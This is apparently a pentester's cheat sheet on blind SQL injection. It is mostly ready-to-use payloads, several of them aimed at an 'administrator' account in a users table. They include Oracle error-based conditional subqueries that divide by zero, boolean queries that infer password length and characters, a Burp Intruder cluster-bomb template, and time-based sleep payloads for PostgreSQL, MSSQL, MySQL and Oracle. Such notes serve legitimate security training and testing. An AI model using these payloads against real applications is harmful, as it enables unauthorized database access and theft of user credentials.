# BlindSQL:
Truth must be "infered" generally with a sleep function, a 500 response, or DNS callout to webhooks/collaborator

Once we can get an injection, we need to confirm that the server is interpreting the injection as a valid query. This is done with a subquery.  
We initially send an empty query, if a 500 is returned, we may need to complete the query by selecting from a db. Ifreceive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
`' ||(select '')||'`  
`' ||(select '' from dual)||'`  
We can then start to infer information, such as the existence of `users`  
`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
We weaponise this using the CASE statement, which will test a condition and if true/false will evaluate an expression.  
So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
Now we start to infer the existence of information (users, passwords, tables, etc)  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 
Length of password  
`'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'. Then send: TrackingId='||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`


#### Testing booleans (for BSQLi)
Remember to try `AND` `OR` `HAVING`  
we can test the ability bruteforce/presence of users by selecting a char, limiting to 1 and then comparing, so the below would become `a=a`  
`b' OR (select 'a' from users limit 1)='a`  
Now we can take a step further and confirm we have a user called "Administrator"  
`b' OR (select 'a' from users where username='administrator')='a`  
The ball keeps on rolling, and we can begin the makings of bruteforce attack by testing the length of password  
`b' OR (select 'a' from users where username='administrator' and length(password)>1)='a;`  
Once we have the length of the password we can bruteforce with a python script or intruder.
For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
`b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  

#### sleep examples
postgresql  
  * `'||pg_sleep(10)--`  
  *  `||(SELECT+CASE+WHEN+(username='administrator'+and+SUBSTRING(username,+1,+1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users)--`
mssql  
  * `if 1=1 waitfor delay'0:0:08'--`  
  * `' if(SUBSTRING(VERSION(),'1','0')=='{c}') waitfor delay'0:0:08'--`  
mysql
  * `1-SLEEP(15)`
  * `1-BENCHMARK(100000000, rand())`
  * `1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)`
sqlserver
 * `1; WAIT FOR DELAY '00:00:15'`
 * `1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'`
oracle #DOES NOT support stacked queries, if you come accross this you will to inject into PL/SQL code block
 * `BEGIN DBMS_LOCK.SLEEP(15); END;`

#### Example PoCs: 
[BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py)  
[BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)  
